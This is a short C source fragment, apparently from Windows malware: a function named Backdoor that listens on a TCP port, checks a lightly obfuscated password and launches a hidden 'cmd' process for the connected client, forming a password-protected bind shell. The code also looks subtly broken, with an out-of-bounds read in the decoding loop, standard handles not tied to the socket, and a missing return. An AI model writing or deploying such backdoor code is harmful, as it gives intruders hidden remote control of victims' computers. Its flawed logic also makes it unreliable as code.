int Backdoor(void) {
	STARTUPINFO si;
	struct sockaddr_in sa;
	PROCESS_INFORMATION pi;
	int s, i = -1, slide = 0;
	
	WSADATA HWSAdata;
	WSAStartup(MAKEWORD(2,2), &HWSAdata);

	s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);

	sa.sin_family = AF_INET;
	sa.sin_port = htons(BindShellPort);
	sa.sin_addr.s_addr = htonl(INADDR_ANY);

	bind(s, (struct sockaddr *) &sa, 16);
	listen(s, 1);
	s = accept(s, (struct sockaddr *)&sa, NULL);

	char buffer[200];
	memset(buffer,'\0',sizeof(buffer));
	recv(s, buffer, sizeof(buffer), 0);
	while(buffer[i++] != '\0') buffer[i] -= ++slide;
	if(!(strcmp(buffer,BindShellPass) == 0)) {
		send(s,"Invalid Password",16,0); // Argument 3, size of a string begins with 0 and be sure to add the string terminator also, so the size of that string is 16.
		closesocket(s);
		return 1;
	} else send(s,"Hai there! =)",13,0);

	si.cb = sizeof(si);
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdError = (void *) 2;

	si.lpDesktop = si.lpTitle = (char *) 0x0000;
	si.lpReserved2 = NULL;
	CreateProcess(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, (STARTUPINFO*)&si, &pi);
}
